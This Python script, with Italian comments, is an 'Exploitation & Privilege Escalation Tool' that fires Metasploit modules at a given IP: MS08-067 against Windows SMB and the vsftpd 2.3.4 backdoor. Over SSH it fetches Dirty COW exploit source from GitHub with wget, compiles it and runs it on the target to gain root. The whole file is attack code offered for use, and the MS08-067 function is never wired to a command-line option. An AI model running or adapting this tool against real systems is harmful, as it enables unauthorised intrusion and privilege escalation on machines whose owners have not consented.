import os
import argparse
import subprocess

# Funzione per eseguire un exploit di Buffer Overflow (MS08-067 su Windows)
def run_buffer_overflow(target_ip):
    print(f"[+] Esecuzione Buffer Overflow su {target_ip} (MS08-067)...")
    try:
        # Esegui l'exploit con Metasploit (MS08-067)
        command = f"msfconsole -x 'use exploit/windows/smb/ms08_067_netapi; set RHOST {target_ip}; run'"
        print(f"[+] Avvio exploit MS08-067 su {target_ip}...")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"[!] Errore durante l'exploit: {str(e)}")

# Funzione per eseguire una Privilege Escalation su Linux (Dirty COW)
def run_privilege_escalation(target_ip):
    print(f"[+] Esecuzione Privilege Escalation su {target_ip} (Dirty COW)...")
    try:
        # Scarica e compila lo script Dirty COW su Linux per escalation dei privilegi
        # Si assume che tu abbia un accesso a shell non privilegiato su una macchina Linux vulnerabile
        command = f"ssh {target_ip} 'wget https://raw.githubusercontent.com/stealthcopter/dirtycow/master/dirtyc0w.c && gcc -pthread -o dirtyc0w dirtyc0w.c && ./dirtyc0w'"
        print(f"[+] Avvio dell'exploit Dirty COW su {target_ip}...")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"[!] Errore durante l'escalation dei privilegi: {str(e)}")

# Funzione per eseguire uno script di exploitation generico
def run_exploitation(target_ip):
    print(f"[+] Avvio attacco di exploitation su {target_ip}...")
    try:
        # Utilizzo di Metasploit per l'exploit di una vulnerabilit√†
        command = f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {target_ip}; run'"
        print(f"[+] Tentativo di exploit tramite Metasploit su {target_ip}...")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"[!] Errore durante l'exploit: {str(e)}")

# Funzione principale per l'esecuzione dei comandi da terminale
def main():
    parser = argparse.ArgumentParser(description="Exploitation & Privilege Escalation Tool")

    # Definire i comandi da terminale
    parser.add_argument('-t', '--target', type=str, required=True, help="Indirizzo IP del target")
    parser.add_argument('-e', '--exploitation', action='store_true', help="Esegui exploit")
    parser.add_argument('-p', '--privilege-escalation', action='store_true', help="Esegui privilege escalation")

    # Parsing degli argomenti
    args = parser.parse_args()

    if args.exploitation:
        run_exploitation(args.target)

    if args.privilege_escalation:
        run_privilege_escalation(args.target)

if __name__ == "__main__":
    main()
